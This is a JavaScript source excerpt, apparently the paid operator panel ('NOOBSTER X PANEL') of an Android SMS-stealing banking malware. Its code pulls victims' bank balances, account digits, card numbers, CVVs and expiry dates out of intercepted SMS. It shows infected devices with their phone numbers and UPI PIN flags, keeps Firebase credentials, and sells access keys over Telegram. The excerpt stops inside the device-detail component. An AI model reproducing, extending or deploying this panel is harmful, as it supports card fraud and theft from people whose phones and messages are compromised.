    megaphone: e(Fragment, null, e("path", { d: "m3 11 18-5v12L3 14v-3z" }), e("path", { d: "M11.6 16.8a3 3 0 1 1-5.8-1.6" })),
    lock: e(Fragment, null, e("rect", { width: 18, height: 11, x: 3, y: 11, rx: 2 }), e("path", { d: "M7 11V7a5 5 0 0 1 10 0v4" })),
    settings: e(Fragment, null, e("circle", { cx: 12, cy: 12, r: 3 }), e("path", { d: "M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z" }))
  };
  return e("svg", { width: size, height: size, viewBox: "0 0 24 24", fill: name === "star" ? "currentColor" : "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round", className }, P[name] || null);
};

// ---------- Toast ----------
function Toast({ msg, type, onClose }) {
  useEffect(() => { const t = setTimeout(onClose, 3500); return () => clearTimeout(t); }, [onClose]);
  return e("div", {
    className: "fixed bottom-6 left-1/2 -translate-x-1/2 z-50 px-5 py-3 rounded-2xl text-sm font-semibold shadow-xl animate-fade-up",
    style: {
      background: "#1a1a1a",
      border: "1px solid " + (type === "error" ? "rgba(239,68,68,0.4)" : type === "success" ? "rgba(34,197,94,0.4)" : "#333"),
      color: type === "error" ? "#f87171" : type === "success" ? "#4ade80" : "#fff",
      maxWidth: "90vw"
    }
  }, msg);
}

// ---------- SMS Analysis ----------
const BANK_PATTERNS = [
  [/HDFCBK|HDFCBANK|HDFC/i, "HDFC Bank"], [/SBIIN|SBIINB|SBI/i, "SBI"], [/ICICIB|ICICI/i, "ICICI Bank"],
  [/AXISBK|AXISBANK|AXIS/i, "Axis Bank"], [/KOTAKB|KOTAK/i, "Kotak Bank"], [/PNBSMS|PNB/i, "PNB"],
  [/BOIIND|BOI/i, "Bank of India"], [/CANBNK|CANARA/i, "Canara Bank"], [/UNIONB|UBISMS/i, "Union Bank"],
  [/YESBNK|YESBANK/i, "Yes Bank"], [/IDBIBK|IDBI/i, "IDBI Bank"], [/INDUSB|INDUSIND/i, "IndusInd Bank"],
  [/FEDERAL|FEDBNK/i, "Federal Bank"], [/RBLBNK|RBL/i, "RBL Bank"], [/PAYTM/i, "Paytm"],
  [/PHONEPE|PHNPE/i, "PhonePe"], [/GPAY|GOOGLEPAY/i, "Google Pay"], [/AMAZONPAY/i, "Amazon Pay"],
  [/CRED/i, "CRED"], [/AIRTEL/i, "Airtel Payments"], [/JIOMNY|JIOMONEY/i, "Jio Money"]
];
function detectBank(sender) {
  for (const [re, name] of BANK_PATTERNS) if (re.test(sender)) return name;
  const m = (sender || "").toUpperCase().match(/(?:[A-Z]{2}-)?([A-Z0-9]+)/);
  return m ? m[1] : (sender || "Bank");
}
const BAL_PATTERNS = [
  /Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
  /Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
  /Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i,
  /Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
  /Bal[\.:]?\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i
];
const TXN_PATTERNS = [
  /(?:debited|credited|withdrawn|deposited)(?:\s+(?:by|with|for|of))?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
  /(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)/i
];
const ACCT_PATTERNS = [
  /(?:A\/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})/i,
  /[xX*]{4,}([0-9]{4})/i, /ending\s+(?:with\s+)?([0-9]{4})/i
];
const CARD_PATTERNS = [/card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i, /(?:card|debit|credit)(?:\s+(?:no\.?|number|ending|#))?[\s:*xX]+([xX*]{0,8}[0-9]{4})/i];
const CVV_PATTERNS = [/CVV[\s:]+([0-9]{3,4})/i, /(?:cvv|cvc|security\s+code)[\s:]+([0-9]{3,4})/i];
const EXP_PATTERNS = [/(?:expiry|exp|valid\s+thru?|valid\s+till)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i];
const PHONE_PATTERNS = [
  /(?:Jio|JIO)\s+(?:Number|No\.?|Num)[\s:\-]+([6-9][0-9]{9})/,
  /(?:Airtel|AIRTEL)\s+(?:Number|No\.?)[\s:\-]+([6-9][0-9]{9})/,
  /(?:BSNL|bsnl)\s+(?:Number|No\.?)[\s:\-]+([6-9][0-9]{9})/,
  /(?:mobile|phone|contact)\s+(?:no\.?|number|num)[\s:\-]+([6-9][0-9]{9})/i,
  /(\+91[\-\s]?[6-9][0-9]{9})/,
  /(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)/
];
function detectBankSMS(text, sender) {
  if (!text || text.trim().length < 8) return null;
  const hasKw = /AVL|AVAL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|A\/C|ACCOUNT|INR|RUPEE/i.test(text);
  const isBankSender = BANK_PATTERNS.some(([re]) => re.test(sender));
  if (!hasKw && !isBankSender) return null;
  let balance = null;
  for (const re of BAL_PATTERNS) { const m = text.match(re); if (m && m[1]) { balance = m[1].replace(/,/g, ""); break; } }
  if (!balance) return null;
  let amount = null;
  for (const re of TXN_PATTERNS) { const m = text.match(re); if (m && m[1] && m[1].replace(/,/g, "") !== balance) { amount = m[1].replace(/,/g, ""); break; } }
  let type = null;
  if (/credit(?:ed)?/i.test(text)) type = "credit";
  else if (/debit(?:ed)?|withdraw|paid|purchase|spent/i.test(text)) type = "debit";
  let last4 = null;
  for (const re of ACCT_PATTERNS) { const m = text.match(re); if (m && m[1]) { last4 = m[1].replace(/[^0-9]/g, "").slice(-4); break; } }
  let phone = null;
  for (const re of PHONE_PATTERNS) { const m = text.match(re); if (m) { let d = m[1].replace(/[^0-9]/g, ""); if (d.length === 12 && d.startsWith("91")) d = d.slice(2); if (d.length === 10 && /^[6-9]/.test(d)) { phone = d; break; } } }
  return { bankName: detectBank(sender), senderName: sender || "Unknown", availableBalance: balance, transactionAmount: amount, transactionType: type, accountLast4: last4, phoneFromSms: phone, rawSms: text, detectedAt: new Date().toISOString() };
}
function detectCard(text) {
  if (!text) return null;
  if (!/CARD|CVV|CREDIT|DEBIT/.test(text.toUpperCase())) return null;
  let last4 = null;
  for (const re of CARD_PATTERNS) { const m = text.match(re); if (m && m[1]) { const d = m[1].replace(/[^0-9]/g, ""); if (d.length >= 4) { last4 = d.slice(-4); break; } } }
  if (!last4) return null;
  let cardType = "";
  if (/VISA/i.test(text)) cardType = "VISA";
  else if (/MASTER(?:CARD)?/i.test(text)) cardType = "Mastercard";
  else if (/RUPAY/i.test(text)) cardType = "RuPay";
  else if (/AMEX/i.test(text)) cardType = "Amex";
  else if (/credit/i.test(text)) cardType = "Credit Card";
  else if (/debit/i.test(text)) cardType = "Debit Card";
  let cvv = "", expiry = "";
  for (const re of CVV_PATTERNS) { const m = text.match(re); if (m && m[1]) { cvv = m[1]; break; } }
  for (const re of EXP_PATTERNS) { const m = text.match(re); if (m && m[1]) { expiry = m[1]; break; } }
  return { cardLast4: last4, cardType, cvv: cvv || undefined, expiry: expiry || undefined, rawSms: text };
}
function analyzeSMS(messages) {
  const bankBalances = [], cards = [];
  messages.forEach(m => {
    const b = detectBankSMS(m.text, m.sender);
    if (b) { b.detectedAt = m.time || b.detectedAt; bankBalances.push(b); }
    const c = detectCard(m.text);
    if (c) cards.push(c);
  });
  return { bankBalances, cards, phoneNumbers: [], networks: [] };
}

// ---------- Share links ----------
function makeShareLink(url, key) {
  const b = btoa(unescape(encodeURIComponent(url + "|||" + key)));
  return window.location.origin + window.location.pathname + "?s=" + b;
}
function decodeShare(s) {
  try {
    const t = decodeURIComponent(escape(atob(s)));
    const [u, k] = t.split("|||");
    if (u && k) return { url: u, key: k };
  } catch {}
  return null;
}

// ---------- API KEY CHECK ----------
function getApiKeyFromPath() {
  const path = window.location.pathname;
  const m = path.match(/^\/v2\/([A-Za-z0-9_\-]+)/);
  return m ? m[1] : null;
}
function validateApiKey(key) {
  if (!key) return { valid: false, reason: "missing" };
  const list = LS.get(K_APIKEYS, []);
  const found = list.find(x => x.key === key);
  if (!found) return { valid: false, reason: "invalid" };
  if (!found.active) return { valid: false, reason: "inactive" };
  if (found.expiresAt && found.expiresAt > 0 && Date.now() > found.expiresAt) {
    return { valid: false, reason: "expired", keyObj: found };
  }
  return { valid: true, keyObj: found };
}

// ---------- COMPONENTS ----------

function AccessDeniedScreen({ reason, keyObj }) {
  const isExpired = reason === "expired";
  return e("div", { className: "min-h-screen flex items-center justify-center p-4" },
    e("div", { className: "glass-card rounded-3xl p-8 max-w-md w-full text-center shadow-2xl" },
      e("div", { className: "w-20 h-20 rounded-2xl mx-auto mb-6 flex items-center justify-center", style: { background: "rgba(220,38,38,0.15)", border: "1px solid rgba(220,38,38,0.3)" } },
        e(Icon, { name: "lock", size: 40, className: "text-red-400" })
      ),
      e("h1", { className: "text-2xl font-black text-red-400 mb-3" }, isExpired ? "API Key Expired" : "Access Denied"),
      e("p", { className: "text-sm mb-6", style: { color: "#888" } },
        isExpired ? "Your API key has expired." : "Please enter a valid API key in the URL."
      ),
      isExpired && keyObj && e("div", { className: "p-4 rounded-xl mb-6 text-left", style: { background: "rgba(69,10,10,0.3)", border: "1px solid rgba(127,29,29,0.4)" } },
        e("p", { className: "text-[10px] uppercase tracking-widest mb-1", style: { color: "#f87171" } }, "Expired On"),
        e("p", { className: "text-sm font-bold text-white" }, fmtExpiry(keyObj.expiresAt)),
        e("p", { className: "text-[10px] mt-2 font-mono", style: { color: "#555" } }, "Key: " + (keyObj.key || "").substring(0, 20) + "…")
      ),
      e("div", { className: "p-4 rounded-xl mb-6", style: { background: "rgba(245,158,11,0.1)", border: "1px solid rgba(245,158,11,0.25)" } },
        e("p", { className: "text-base font-bold text-amber-400 mb-2" }, "🔑 Please Buy a New API Key"),
        e("p", { className: "text-xs mb-3", style: { color: "#ccc" } }, "Message Me On Telegram to get a new API key"),
        e("a", {
          href: "https://t.me/" + CFG.CONTACT_USERNAME.replace("@", ""),
          target: "_blank",
          className: "inline-flex items-center gap-2 px-5 py-2.5 rounded-xl font-bold text-sm",
          style: { background: "linear-gradient(135deg,#229ED9,#0088cc)", color: "#fff" }
        }, e(Icon, { name: "send", size: 14 }), CFG.CONTACT_USERNAME)
      ),
      e("p", { className: "text-xs mt-4", style: { color: "#555" } }, "Example URL format: /v2/YOUR_API_KEY")
    )
  );
}

// ---------- LOGIN (public dashboard) ----------
function LoginScreen({ onConnect, onConnectAll }) {
  const [accounts, setAccounts] = useState(() => LS.get(K_ACCOUNTS, []));
  const [showForm, setShowForm] = useState(false);
  const [url, setUrl] = useState("");
  const [key, setKey] = useState("");
  const [err, setErr] = useState("");
  const [busy, setBusy] = useState(false);
  const [shareLink, setShareLink] = useState("");
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    const s = new URLSearchParams(window.location.search).get("s");
    if (s) {
      const d = decodeShare(s);
      if (d) { window.history.replaceState({}, "", window.location.pathname); autoConnect(d.url, d.key); }
    }
  }, []);

  const autoConnect = async (u, k) => {
    setBusy(true); setErr("");
    try { await fbFetch(u, k, "clients"); onConnect(u, k); }
    catch (e) { setErr("Shared link failed: " + e.message); }
    finally { setBusy(false); }
  };
  const saveAccs = (l) => { setAccounts(l); LS.set(K_ACCOUNTS, l); };
  const connectSaved = async (acc) => {
    setBusy(true); setErr("");
    try { await fbFetch(acc.url, acc.key, "clients"); onConnect(acc.url, acc.key); }
    catch (e) { setErr("Connection failed: " + e.message); }
    finally { setBusy(false); }
  };
  const submit = async () => {
    if (!url.trim() || !key.trim()) { setErr("Enter URL and Key"); return; }
    setBusy(true); setErr("");
    try {
      await fbFetch(url, key, "clients");
      const acc = { id: Date.now(), url: url.trim(), key: key.trim(), date: new Date().toLocaleString() };
      saveAccs([...accounts, acc]);
      onConnect(url.trim(), key.trim());
    } catch (e) { setErr(e.message); }
    finally { setBusy(false); }
  };
  const delAcc = (id, ev) => { ev.stopPropagation(); if (confirm("Delete this account?")) saveAccs(accounts.filter(a => a.id !== id)); };
  const shareAcc = (acc, ev) => { ev.stopPropagation(); setShareLink(makeShareLink(acc.url, acc.key)); setCopied(false); };
  const copyLink = () => { navigator.clipboard.writeText(shareLink); setCopied(true); setTimeout(() => setCopied(false), 2000); };

  return e("div", { className: "min-h-screen flex items-center justify-center relative overflow-hidden p-4", style: { background: "radial-gradient(ellipse at 60% 0%, rgba(120,20,20,0.5) 0%, transparent 60%), radial-gradient(ellipse at 0% 100%, #0a0f18 0%, #050810 100%)" } },
    e("div", { className: "absolute top-0 right-1/4 w-96 h-96 rounded-full blur-3xl", style: { background: "radial-gradient(circle, #ef4444, transparent)", opacity: 0.1 } }),
    e("div", { className: "relative z-10 w-full max-w-md py-8" },
      e("div", { className: "text-center mb-8" },
        e("div", { className: "inline-flex items-center justify-center w-16 h-16 rounded-2xl mb-4 red-gradient shadow-lg", style: { boxShadow: "0 10px 15px -3px rgba(127,29,29,0.5)" } },
          e("img", { src: "https://i.ibb.co/TMbrv7yV/noobster.jpg", style: { width: "100%", height: "100%", objectFit: "cover", borderRadius: "inherit" } })
        ),
        e("h1", { className: "text-4xl font-bold italic tracking-tight animate-fade-in" },
          e("span", { style: { color: "#6acfff" } }, "NOOBSTER X "),
          e("span", null, "PANEL"),
          e("span", { className: "relative" }, e("span", { className: "absolute -top-1 -right-1 w-2 h-2 rounded-full animate-glint", style: { background: "#6acfff" } }))
        ),
        e("p", { className: "text-sm mt-2 animate-fade-in", style: { color: "#666" } }, "Device Management Console")
      ),
      e("div", { className: "glass-card rounded-3xl p-7 shadow-2xl" },
        !showForm && e(Fragment, null,
          e("div", { className: "flex items-center justify-between mb-4" },
            e("div", { className: "flex items-center gap-2" },
              e(Icon, { name: "wifi", size: 16, className: "text-[#666]" }),
              e("span", { className: "text-sm font-semibold" }, "Saved Accounts")
            ),
            e("span", { className: "text-xs px-2 py-1 rounded-full", style: { background: "#222", color: "#666" } }, accounts.length + " account" + (accounts.length === 1 ? "" : "s"))
          ),
          accounts.length > 0 && e("button", {
            onClick: () => !busy && onConnectAll && onConnectAll(accounts),
            className: "w-full flex items-center justify-center gap-2 py-3 rounded-xl font-bold text-sm mb-3",
            style: { background: "linear-gradient(90deg, #2563eb, #7c3aed)", color: "#fff" }
          }, e(Icon, { name: "wifi", size: 16 }), " Connect All (" + accounts.length + ")"),
          e("div", { className: "mb-4", style: { maxHeight: "13rem", overflowY: "auto", paddingRight: "4px" } },
            accounts.length === 0
              ? e("div", { className: "text-center py-8", style: { color: "#555" } },
                  e(Icon, { name: "wifi", size: 32, className: "mx-auto mb-2 opacity-30" }),
                  e("p", { className: "text-sm" }, "No saved accounts"))
              : accounts.map(acc => e("div", { key: acc.id, onClick: () => !busy && connectSaved(acc), className: "flex items-center gap-3 p-3 rounded-xl cursor-pointer mb-2 transition-all", style: { border: "1px solid #1a1a1a" } },
                  e("div", { className: "flex-1 min-w-0" },
                    e("p", { className: "text-sm font-semibold truncate" }, acc.url),
                    e("p", { className: "text-xs mt-1 font-mono truncate", style: { color: "#555" } }, acc.date + " · " + acc.key.substring(0, 20) + "…")
                  ),
                  e("button", { onClick: ev => shareAcc(acc, ev), className: "p-1.5 rounded-lg", style: { background: "rgba(23,37,84,0.6)", border: "1px solid rgba(30,64,175,0.4)", color: "#60a5fa" } }, e(Icon, { name: "share", size: 12 })),
                  e("button", { onClick: ev => delAcc(acc.id, ev), className: "p-1.5 rounded-lg", style: { background: "rgba(69,10,10,0.6)", border: "1px solid rgba(127,29,29,0.4)", color: "#f87171" } }, e(Icon, { name: "trash", size: 12 }))
                ))
          ),
          e("button", {
            onClick: () => { setShowForm(true); setErr(""); },
            className: "w-full flex items-center justify-center gap-2 py-3 rounded-xl border-dashed text-sm font-medium",
            style: { border: "1px dashed #333", color: "#666", background: "transparent" }
          }, e(Icon, { name: "plus", size: 16 }), " New Account")
        ),
        showForm && e("div", { className: "animate-fade-up" },
          e("div", { className: "flex items-center gap-2 mb-5" },
            e("button", { onClick: () => { setShowForm(false); setErr(""); setUrl(""); setKey(""); }, className: "p-1.5 rounded-lg", style: { background: "#1a1a1a" } }, e(Icon, { name: "chevron", size: 16, className: "rotate-180" })),
            e("h3", { className: "font-semibold" }, "New Firebase Account")
          ),
          e("div", { className: "mb-4" },
            e("label", { className: "block text-xs font-semibold uppercase tracking-wider mb-2", style: { color: "#666" } }, "Firebase URL"),
            e("input", { type: "text", value: url, onChange: ev => setUrl(ev.target.value), placeholder: "https://your-project.firebaseio.com", className: "w-full px-4 py-3 rounded-xl outline-none text-sm font-mono", style: { background: "#111", border: "1px solid #222", color: "#fff" } })
          ),
          e("div", { className: "mb-4" },
            e("label", { className: "block text-xs font-semibold uppercase tracking-wider mb-2", style: { color: "#666" } }, "Auth Key / Secret"),
            e("input", { type: "text", value: key, onChange: ev => setKey(ev.target.value), placeholder: "Your Firebase secret key", className: "w-full px-4 py-3 rounded-xl outline-none text-sm font-mono", style: { background: "#111", border: "1px solid #222", color: "#fff" } })
          ),
          e("div", { className: "flex gap-3" },
            e("button", { onClick: submit, disabled: busy, className: "flex-1 py-3 rounded-xl font-semibold text-sm red-gradient text-white disabled:opacity-50" }, busy ? "Connecting…" : "Save & Connect"),
            e("button", { onClick: () => { setShowForm(false); setErr(""); setUrl(""); setKey(""); }, className: "px-5 py-3 rounded-xl text-sm font-medium", style: { background: "#222", color: "#888" } }, "Cancel")
          )
        ),
        err && e("p", { className: "mt-4 text-center text-sm text-red-400 animate-fade-up" }, err)
      ),
      e("p", { className: "text-center text-xs mt-6", style: { color: "#333" } }, "NOOBSTER X Panel Console · API key required for access"),
      shareLink && e("div", { className: "fixed inset-0 z-50 flex items-center justify-center px-4", style: { background: "rgba(0,0,0,0.75)", backdropFilter: "blur(6px)" }, onClick: () => setShareLink("") },
        e("div", { className: "w-full max-w-md glass-card rounded-2xl p-6 shadow-2xl", onClick: ev => ev.stopPropagation() },
          e("div", { className: "flex items-center justify-between mb-5" },
            e("h3", { className: "font-semibold text-sm" }, "Share Connection"),
            e("button", { onClick: () => setShareLink(""), className: "p-1.5 rounded-lg", style: { color: "#888" } }, e(Icon, { name: "x", size: 16 }))
          ),
          e("div", { className: "flex items-center gap-2 p-3 rounded-xl mb-4", style: { background: "#111", border: "1px solid #222" } },
            e("span", { className: "text-xs font-mono flex-1 truncate", style: { color: "#888" } }, shareLink),
            e("button", { onClick: copyLink, className: "px-3 py-1.5 rounded-lg text-xs font-semibold", style: { background: copied ? "rgba(6,78,59,0.5)" : "rgba(23,37,84,0.6)", color: copied ? "#4ade80" : "#60a5fa" } }, copied ? "Copied!" : "Copy")
          ),
          e("p", { className: "text-xs", style: { color: "#fbbf24" } }, "⚠️ Contains credentials. Share carefully.")
        )
      )
    )
  );
}

// ---------- Battery bar ----------
function BatteryBar({ percent }) {
  const color = percent >= 60 ? "#4ade80" : percent >= 30 ? "#facc15" : "#ef4444";
  return e("div", { className: "flex items-center gap-1.5" },
    e("div", { className: "flex items-center" },
      e("div", { className: "flex items-center rounded", style: { width: 26, height: 12, padding: 2, border: "1px solid #555" } },
        e("div", { className: "rounded h-full transition-all duration-500", style: { width: Math.max(5, percent) + "%", background: color } })
      ),
      e("div", { style: { width: 3, height: 5, background: "#555", borderRadius: "0 2px 2px 0", marginLeft: -1 } })
    ),
    e("span", { className: "text-xs font-semibold tabular-nums", style: { color } }, percent + "%")
  );
}

// ---------- Device Card ----------
function DeviceCard({ dev, starred, onToggleStar, onClick }) {
  const analysis = dev.smsAnalysis || { bankBalances: [], cards: [] };
  const topBank = analysis.bankBalances[0];
  const hasCard = analysis.cards.length > 0;
  const hasBank = analysis.bankBalances.length > 0;
  return e("div", { onClick, className: "group relative rounded-2xl p-4 cursor-pointer transition-all duration-200 hover:-translate-y-1",
    style: { background: "#000", border: "1px solid " + (starred ? "rgba(245,158,11,0.5)" : "#1f1f1f") } },
    e("div", { className: "flex items-start gap-3 mb-3" },
      e("div", { className: "w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0", style: { background: dev.status ? "rgba(34,197,94,0.15)" : "#1a1a1a", border: "1px solid " + (dev.status ? "rgba(34,197,94,0.25)" : "#262626") } },
        e(Icon, { name: "wifi", size: 20, className: dev.status ? "text-emerald-400" : "text-[#444]" })
      ),
      e("div", { className: "flex-1 min-w-0" },
        e("h3", { className: "text-sm font-bold text-white truncate" }, dev.name),
        e("p", { className: "text-[9px] font-mono mt-0.5 truncate", style: { color: "#555" } }, dev.id)
      ),
      e("div", { className: "flex items-center gap-1 flex-shrink-0" },
        e("button", { onClick: ev => { ev.stopPropagation(); onToggleStar && onToggleStar(dev.id); },
          className: "p-1 rounded-lg", style: { background: starred ? "rgba(245,158,11,0.2)" : "transparent", color: starred ? "#fbbf24" : "#444", border: starred ? "1px solid rgba(245,158,11,0.4)" : "none" } },
          e(Icon, { name: "star", size: 14 })
        ),
        dev.upipin && e(Icon, { name: "zap", size: 14, className: "text-amber-400" }),
        hasBank && e(Icon, { name: "rupee", size: 14, className: "text-emerald-400" }),
        hasCard && e(Icon, { name: "card", size: 14, className: "text-purple-400" })
      )
    ),
    e("div", { className: "grid grid-cols-2 gap-3 mb-3" },
      e("div", null,
        e("p", { className: "text-[9px] font-semibold uppercase tracking-widest mb-1", style: { color: "#444" } }, "Android"),
        e("p", { className: "text-sm font-bold", style: { color: "#ccc" } }, dev.android !== "—" ? "v" + dev.android.replace("v", "") : "—")
      ),
      e("div", null,
        e("p", { className: "text-[9px] font-semibold uppercase tracking-widest mb-1", style: { color: "#444" } }, "Battery"),
        e(BatteryBar, { percent: dev.batteryPercent })
      )
    ),
    e("div", { className: "grid grid-cols-2 gap-3 mb-3" },
      e("div", null,
        e("p", { className: "text-[9px] font-semibold uppercase tracking-widest mb-1", style: { color: "#444" } }, "Number"),
        e("p", { className: "text-xs font-mono truncate", style: { color: "#aaa" } }, dev.phoneNumber)
      ),
      dev.provider !== "—" && e("div", null,
        e("p", { className: "text-[9px] font-semibold uppercase tracking-widest mb-1", style: { color: "#444" } }, "Network"),
        e("p", { className: "text-xs font-semibold truncate", style: { color: "#aaa" } }, dev.provider)
      )
    ),
    topBank && e("div", { className: "mb-3 px-3 py-2 rounded-xl", style: { background: "rgba(2,44,34,0.2)", border: "1px solid rgba(6,78,59,0.2)" } },
      e("div", { className: "flex items-center justify-between" },
        e("div", { className: "flex items-center gap-1.5" },
          e(Icon, { name: "rupee", size: 14, className: "text-emerald-400" }),
          e("span", { className: "text-[10px] font-semibold text-emerald-400" }, topBank.bankName)
        ),
        e("span", { className: "text-sm font-black text-white" }, "₹" + fmtCurrency(topBank.availableBalance))
      )
    ),
    hasCard && e("div", { className: "mb-3 px-3 py-1.5 rounded-xl flex items-center gap-2", style: { background: "rgba(59,7,100,0.2)", border: "1px solid rgba(88,28,135,0.2)" } },
      e(Icon, { name: "card", size: 14, className: "text-purple-400" }),
      e("span", { className: "text-[10px] font-semibold text-purple-400" }, "Card ••" + analysis.cards[0].cardLast4)
    ),
    e("div", { className: "flex items-center gap-2 flex-wrap" },
      e("span", { className: "w-2 h-2 rounded-full", style: { background: dev.status ? "#22c55e" : "#333", boxShadow: dev.status ? "0 0 6px #22c55e" : "none" } }),
      dev.status ? e("span", { className: "text-xs font-semibold text-emerald-400" }, "Online")
        : e("div", { className: "flex items-center gap-1.5 min-w-0" },
            e("span", { className: "text-xs", style: { color: "#555" } }, "Offline"),
            dev.lastSeen && e("span", { className: "text-[10px] font-mono px-1.5 py-0.5 rounded", style: { color: "#444", background: "#111", border: "1px solid #1e1e1e" } }, timeAgo(dev.lastSeen))
          ),
      dev.upipin && e("span", { className: "ml-auto px-2 py-0.5 rounded-full text-[10px] font-semibold", style: { background: "rgba(245,158,11,0.1)", border: "1px solid rgba(245,158,11,0.2)", color: "#fbbf24" } }, "UPI")
    )
  );
}

// ---------- InfoRow ----------
function InfoRow({ label, value, mono }) {
  return e("div", { className: "flex items-start justify-between py-2.5", style: { borderBottom: "1px solid #1a1a1a" } },
    e("span", { className: "text-xs font-medium flex-shrink-0", style: { color: "#555", width: "8rem" } }, label),
    e("span", { className: "text-xs text-right break-all " + (mono ? "font-mono" : "font-semibold"), style: { color: "#ccc" } }, value || "—")
  );
}

// ---------- Bank Card ----------
function BankCard({ balance }) {
  const isCredit = balance.transactionType === "credit";
  return e("div", { className: "p-3 rounded-xl mb-2", style: { background: "#0a1410", border: "1px solid rgba(6,78,59,0.3)", borderLeft: "2px solid rgba(34,197,94,0.7)" } },
    e("div", { className: "flex items-center justify-between mb-2" },
      e("div", { className: "flex items-center gap-2" },
        e("div", { className: "w-6 h-6 rounded-lg flex items-center justify-center", style: { background: "rgba(34,197,94,0.15)", border: "1px solid rgba(34,197,94,0.25)" } }, e(Icon, { name: "rupee", size: 12, className: "text-emerald-400" })),
        e("span", { className: "text-xs font-bold text-emerald-400" }, balance.bankName)
      ),
      balance.transactionType && e("span", { className: "text-[10px] font-semibold px-2 py-0.5 rounded-full", style: { background: isCredit ? "rgba(34,197,94,0.1)" : "rgba(239,68,68,0.1)", color: isCredit ? "#4ade80" : "#f87171" } }, isCredit ? "Credit" : "Debit")
    ),
    e("div", { className: "flex items-end justify-between" },
      e("div", null,
        e("p", { className: "text-[9px] uppercase tracking-widest mb-0.5", style: { color: "#555" } }, "Available Balance"),
        e("p", { className: "text-xl font-black text-white" }, e("span", { className: "text-emerald-400 text-sm mr-0.5" }, "₹"), fmtCurrency(balance.availableBalance))
      ),
      balance.transactionAmount && e("div", { className: "text-right" },
        e("p", { className: "text-[9px] uppercase tracking-widest mb-0.5", style: { color: "#555" } }, "Txn"),
        e("p", { className: "text-sm font-bold", style: { color: isCredit ? "#4ade80" : "#f87171" } }, (isCredit ? "+" : "-") + "₹" + fmtCurrency(balance.transactionAmount))
      )
    ),
    e("p", { className: "text-[10px] mt-2 line-clamp-2", style: { color: "#333" } }, (balance.rawSms || "").substring(0, 130))
  );
}

// ---------- Card Display ----------
function CardDisplay({ card }) {
  const [showCvv, setShowCvv] = useState(false);
  return e("div", { className: "p-3 rounded-xl mb-2", style: { background: "#0f0a1a", border: "1px solid rgba(88,28,135,0.3)", borderLeft: "2px solid rgba(168,85,247,0.7)" } },
    e("div", { className: "flex items-center justify-between mb-2" },
      e("div", { className: "flex items-center gap-2" },
        e("div", { className: "w-6 h-6 rounded-lg flex items-center justify-center", style: { background: "rgba(168,85,247,0.15)", border: "1px solid rgba(168,85,247,0.25)" } }, e(Icon, { name: "card", size: 12, className: "text-purple-400" })),
        e("span", { className: "text-xs font-bold text-purple-400" }, card.cardType || "Card")
      ),
      card.expiry && e("span", { className: "text-[10px] font-mono", style: { color: "#555" } }, "Exp: " + card.expiry)
    ),
    e("span", { className: "font-mono text-xs", style: { color: "#aaa" } }, "•••• •••• •••• " + card.cardLast4),
    card.cvv && e("div", { className: "flex items-center gap-2 mt-2" },
      e("span", { className: "text-[10px] uppercase tracking-widest", style: { color: "#555" } }, "CVV:"),
      e("span", { className: "text-xs font-mono text-purple-300" }, showCvv ? card.cvv : "•••"),
      e("button", { onClick: () => setShowCvv(!showCvv), className: "p-0.5", style: { color: "#444" } }, e(Icon, { name: showCvv ? "eyeoff" : "eye", size: 12 }))
    )
  );
}

// ---------- Device Skeleton ----------
function DeviceSkeleton() {
  return e("div", { className: "rounded-2xl p-4 animate-pulse", style: { background: "#111", border: "1px solid #1f1f1f" } },
    e("div", { className: "flex items-start gap-3 mb-3" },
      e("div", { className: "w-10 h-10 rounded-xl", style: { background: "#1a1a1a" } }),
      e("div", { className: "flex-1" },
        e("div", { className: "h-3 rounded w-3/4 mb-2", style: { background: "#1a1a1a" } }),
        e("div", { className: "h-2 rounded w-1/2", style: { background: "#151515" } })
      )
    ),
    e("div", { className: "grid grid-cols-2 gap-3" },
      e("div", { className: "h-8 rounded-xl", style: { background: "#151515" } }),
      e("div", { className: "h-8 rounded-xl", style: { background: "#151515" } })
    )
  );
}

// ---------- Device Detail ----------
function DeviceDetail({ dev, fbUrl, fbKey, onClose, onDelete, showToast }) {
  const [messages, setMessages] = useState([]);
  const [analysis, setAnalysis] = useState({ bankBalances: [], cards: [] });
  const [loading, setLoading] = useState(true);
  const [tab, setTab] = useState("info");
  const [sendTo, setSendTo] = useState("");
  const [sendMsg, setSendMsg] = useState("");
